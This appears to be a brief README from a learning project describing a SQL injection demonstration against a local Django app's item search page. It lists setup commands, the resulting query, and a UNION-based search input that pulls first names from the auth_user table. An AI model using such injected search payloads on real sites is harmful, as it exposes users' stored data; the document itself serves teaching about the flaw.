How to perform a SQL Injection Attack

Steps

- pip install Django
- python manage.py runsever
- http://127.0.0.1:8000/items/search
- SELECT name FROM orders_item WHERE name LIKE '%' UNION SELECT first_name FROM auth_user WHERE first_name LIKE '%'
- Search for "z' UNION SELECT first_name FROM auth_user WHERE first_name LIKE '"

Adding a test line. Just for learning reasons.

